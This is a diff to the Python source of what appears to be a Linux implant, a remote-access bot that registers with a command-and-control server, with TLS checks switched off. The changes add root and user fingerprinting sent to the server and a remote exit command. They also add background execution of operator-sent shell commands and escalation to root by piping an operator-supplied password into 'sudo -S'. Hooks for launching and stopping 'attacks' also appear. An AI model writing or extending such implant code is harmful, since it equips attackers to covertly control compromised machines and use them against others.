@@ -82,7 +82,7 @@ class LinuxImpl:
             ssl_context.verify_mode = ssl.CERT_NONE
             
             async with connect(
-                f"wss://{self.c2_ws_url}/api/rcv?id={self.impl_id}",
+                f"wss://{self.c2_ws_url}/api/rcv?id={self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
                 ping_interval=20,
                 ping_timeout=10,
                 close_timeout=10,
@@ -121,6 +121,8 @@ class LinuxImpl:
                 await self._handle_attack_command(ws, data)
             elif 'stop_attack' in data:
                 await self._stop_attack(ws, attack_type=data['stop_attack'])
+            elif 'finish' in data:
+                await self._exit(ws)
         
         except asyncio.TimeoutError:
             
@@ -133,64 +135,114 @@ class LinuxImpl:
             except:
                 pass  
 
+    
+
     async def _execute_command(self, ws, command: str) -> None:
+
         if command.startswith("cd "):
             await self._change_directory(ws, command[3:].strip())
             return
 
-        if command.startswith("sudo"):
+        bg_keywords = ['&', 'nohup', 'disown']
+        is_bg = any(kw in command for kw in bg_keywords)
+        
+        clean_cmd = command
+        for kw in bg_keywords:
+            clean_cmd = clean_cmd.replace(kw, '').strip()
+
+        if clean_cmd == "sudo su" or clean_cmd.startswith("su ") or command == "su":
+            await ws.send(json.dumps({
+                "result": "(sudo su and su) Are not properly in this terminal,try: \n\t sudo ./implant disown\n To elevate privileges",
+                "cwd": self.current_dir
+            }, ensure_ascii=False))
+
+        if clean_cmd.startswith("sudo"):
+
             await ws.send(json.dumps({"prompt": "sudo password: "}))
             msg = await ws.recv()
             data = json.loads(msg)           
             password = data['pass']
 
-            args = shlex.split(command)
-            if args[0] == "sudo" and args[1] != "su":
-                args.insert(1, "-S")
+            if is_bg:
+                if 'nohup' in command:
+                    subprocess.Popen(
+                        f"echo '{password}' | sudo -S {clean_cmd} > /dev/null 2>&1",
+                        shell=True,
+                        stdin=subprocess.DEVNULL,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
+                    )
+                elif 'disown' in command:
+                    subprocess.Popen(
+                        f"echo '{password}' | sudo -S {clean_cmd} > /dev/null 2>&1 & disown",
+                        shell=True,
+                        stdin=subprocess.DEVNULL,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
+                    )
+                elif command.endswith(' &'):
+                    subprocess.Popen(
+                        f"echo '{password}' | sudo -S {clean_cmd} > /dev/null 2>&1 &",
+                        shell=True,
+                        stdin=subprocess.DEVNULL,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
+                    )
+                else:
+                    subprocess.Popen(
+                        f"echo '{password}' | sudo -S {clean_cmd} > /dev/null 2>&1 &",
+                        shell=True,
+                        stdin=subprocess.DEVNULL,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
+                    )
+                output = "Process executed in background"
+            else:
 
-            proc = subprocess.Popen(
-                args,
-                stdin=subprocess.PIPE,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
+                if os.path.basename(sys.argv[0]) in command:
+                    output = "Use (disown, nohup) to execute the current implant"
+                else:                
+                    args = shlex.split(clean_cmd)
+                    args.insert(1, "-S")
 
-            stdout, stderr = proc.communicate(password + '\n')
-            output = stdout if stdout else stderr
+                    proc = subprocess.Popen(
+                        args,
+                        stdin=subprocess.PIPE,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    stdout, stderr = proc.communicate(password + '\n')
+                    output = stdout if stdout else stderr
+                    
         else:
-            out, err, _ = self._execute_shell_command(command)
-            output = out if out else err
+            if is_bg:
+                subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdin=subprocess.DEVNULL,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                output = "Proceso iniciado en background"
+            else:
 
-        if not isinstance(output, str):
-            output = str(output)
-            
-        output = output.replace("\r", "").rstrip()   
+                if os.path.basename(sys.argv[0]) in command:
+                    output = "Use (disown, nohup) to execute the current implant"
+                else:
+                    out, err, _ = self._execute_shell_command(command)
+                    output = out if out else err
+
+        output = str(output).replace("\r", "").rstrip()
         await ws.send(json.dumps({
             "result": output,
             "cwd": self.current_dir
         }, ensure_ascii=False))
 
-    async def _change_directory(self, ws, path: str) -> None:
-        path = path.replace('"', '')
-        if path == "..":
-            self.current_dir = os.path.dirname(self.current_dir)
-        else:
-            new_path = os.path.abspath(os.path.join(self.current_dir, path))
-            if os.path.isdir(new_path):
-                self.current_dir = new_path
-            else:
-                await ws.send(json.dumps({
-                    "error": f"Directory '{path}' doesn't exists.",
-                    "cwd": self.current_dir
-                }))
-                return
-        
-        await ws.send(json.dumps({
-            "result": "",
-            "error": "",
-            "cwd": self.current_dir
-        }))
+
+
+
+
     
     def _execute_shell_command(self, command: str) -> Tuple[str, str, str]:
         try:
@@ -531,8 +583,29 @@ class LinuxImpl:
                         self._notify_attack_completed(ws, attack_type, attack['target']),
                         attack['loop']
                     )
+                    
+    async def _exit(self, ws):
+        await ws.close()
+        sys.exit(0)
+
+
+    def _get_root(self) -> str:
+        try:
+            res = subprocess.check_output('id -u', shell=True)
+            if res.decode().strip() == "0":
+                return True
+            else: 
+                return False
+        except:
+            return 'Undefined'
     
-   
+    def _get_user(self) -> str:
+        try:
+            return subprocess.check_output('whoami', shell=True).decode()
+        except:
+            return 'Undefined'
+
+
     
     async def register(self) -> bool:
        
@@ -542,8 +615,11 @@ class LinuxImpl:
             'public_ip': self._get_public_ip(),
             'local_ip': self._get_local_ips(),
             'operating_system': self._get_operating_system(),
-            'impl_id': self.impl_id
+            'impl_id': f"{self.impl_id}-root={self._get_root()}-user={self._get_user()}".lower(),
+            'root': self._get_root(),
+            'user': self._get_user(),
         }
+
 
         
         session = requests.Session()
@@ -556,7 +632,7 @@ class LinuxImpl:
                 await asyncio.sleep(1)
             try:
                 req = session.post(
-                    f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}",
+                    f"https://{self.c2_ws_url}/api/impl/new/{model['impl_id']}".lower(),
                     data=model,
                     timeout=10,
                     verify=False 
@@ -640,13 +716,12 @@ class LinuxImpl:
         sys.exit(1)
 
 if __name__ == "__main__":
+
     
     C2_WS_URL = "localhost:4444"
     GROUP_NAME = "grupo"
     
 
-
-    
     impl = LinuxImpl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
     
     def signal_handler(sig, frame):
